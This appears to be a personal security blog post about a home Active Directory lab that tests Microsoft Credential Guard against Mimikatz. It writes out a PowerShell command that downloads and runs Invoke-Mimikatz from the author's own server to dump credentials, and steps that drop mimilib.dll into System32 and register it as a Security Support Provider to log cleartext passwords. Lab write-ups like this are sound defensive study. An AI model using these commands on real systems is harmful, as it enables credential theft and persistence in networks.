---
layout: post
title:  "AMSI Bypass and Testing Credential Guard"
---

Credential Guard is an effective way of protecting credentials in an Active Directory domain, of course given that still commonly seen circumstances like obtaining local administrator rights on a machine makes just about anything, including Credential Guard, bypassable. The good thing about Credential Guard is that bypassing it can be a pretty big headache to attackers and give enough time for your SOC to pick up on malicious activity. Depending on other credential-related defense layers you have in your environment, Credential Guard can be one of your domain's strongest defenses.

Without Credential Guard, domain user hashes and passwords are stored in memory which allows local administrators to run tools like Mimikatz and extract said hashes and passwords of other users and potentially even the computer account itself. Even today, with enough lateral movement and password reusage in a domain this is still a surefire way to get Domain Admin and eventually compromise an entire network. 

Credential Guard removes the inherently vulnerable memory-based credential storage and uses Microsoft's **Virtualization Based Security (VBS)** to create a secure **Hyper-V environment** to store your domain credentials, only accessible by trusted processes (known as **Trustlets**) in **VSM (Virtual Secure Mode)**.

## AMSI Bypass

To start off I verify connectivity from my AD lab to my Kali machine by running **tcpdump** and listening for ICMP (Ping):

![ping](/assets/CGTest/ping.png) 

```
sudo tcpdump -i eth0 icmp
```
![tcpdump](/assets/CGTest/tcpdump.png)

Then before running any fancy payloads, test file transfer by starting a python3 webserver on my Kali machine to see if it can be connected to from the AD lab:

```
python3 -m http.server 80
```
![http](/assets/CGTest/http.png) 

![noob](/assets/CGTest/noob.png) 

Now onto the AMSI bypass. Of course Defender won't let me run Mimikatz out of the box so a surprisingly trivial bypass will do the trick. By default Defender will block the bypass PowerShell, but with some obfuscation via string concatenation I'm able to evade Defender detection:

```
IEX (New-Object Net.WebClient).DownloadString("http://192.168.159.128/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
```
![blocked](/assets/CGTest/blocked.png)

![bypass](/assets/CGTest/bypass.png) 

![bypassed](/assets/CGTest/bypassed.png)

## Credential Dumping without Credential Guard

The output below shows what you'd see without Credential Guard. Easily crackable hashes and even plaintext passwords depending on if your domain has other credential-related defenses in place. Computer Accounts can be compromised as well, giving further persistence to an attacker:

![dumpwocg](/assets/CGTest/dumpwocg.png)

![dumpwocg2](/assets/CGTest/dumpwocg2.png)

Enabling Credential Guard is a relatively easy process, granted it isn't quite fully adoptable across the board. It's pretty picky with 3rd parties such as VMware and Nutanix and doesn't work well or at all with nested virtualization, as well as in some cases taking away basic administrative tasks in a virtualized environment. Implementing it for testing in my AD lab was a pain with VMware Workstation but I persisted and got it working for your entertainment.

[Microsoft's documentation is good to follow](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage), plus there are plenty of blogs to walk you through the process or help you troubleshoot errors:

## Credential Dumping with Credential Guard

Once Credential Guard is enabled you can do a few checks to see if it's working properly. "Virtualization-based security" in System Information and checking for Lsalso.exe and "Credential Guard & Key Guard" in Task Manager will do the trick.

```
Get-ComputerInfo -Property DeviceGuard*
```
![enabled1](/assets/CGTest/enabled1.png)

![enabled2](/assets/CGTest/enabled2.png)

![enabled3](/assets/CGTest/enabled3.png)

![enabled4](/assets/CGTest/enabled4.png)

Once these have been verified, and the same steps as before are replicated, the Mimikatz output now shows LSA isolated hashes that I imagine are pretty hard or virtually impossible to crack, depending on the scenario:

![dumpwcg](/assets/CGTest/dumpwcg.png)

![dumpwcg2](/assets/CGTest/dumpwcg2.png)

## Bypassing Credential Guard

With Credential Guard enabled, Mimikatz doesn't have much it can do. As an attacker in this scenario you will need to do some shady and SOC-alertable stuff to get around it, as well as a reboot (it can be done without a reboot, but won't survive a reboot if the user does so at the end of the day), so I hope your persistence is ready for testing. You'll need to use **mimilib.dll** (provided by Mimikatz) to create your own SSP (Security Support Provider) to log credentials in clear text after it's implementation. **Not only this, but you'll need more AV evasion as you'll be writing a file to the disk.**

Also, no one mentions this, but getting mimilib.dll isn't as easy as it sounds. You need to load the Mimikatz Visual Studio Solution file into your Visual Studio (you should have a Windows machine to compile Windows binaries), install dependencies for the project (mine was v141_xp, you can install it via Tools > Get Tools and Features and search for what you need in the "Individual components" tab) and ensure you compile for the correct architecture of your target machine.

Transfer the .dll over like before and place it in C:\Windows\System32:

```
Invoke-WebRequest "http://192.168.159.128/mimilib.dll" -OutFile "C:\Windows\system32\mimilib.dll"
```
![mimilib1](/assets/CGTest/mimilib1.png)

Next add mimilib.dll to the SSP list:

```
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ /f
```
![mimilib2](/assets/CGTest/mimilib2.png)

And after a reboot, you get this lovely file:

![mimilib3](/assets/CGTest/mimilib3.png)

You can also disable Credential Guard, but this is even messier and requires the end user to actively accept a prompt before OS boot that they want to disable Credential Guard...if that's successful, you deserve the domain my friend.
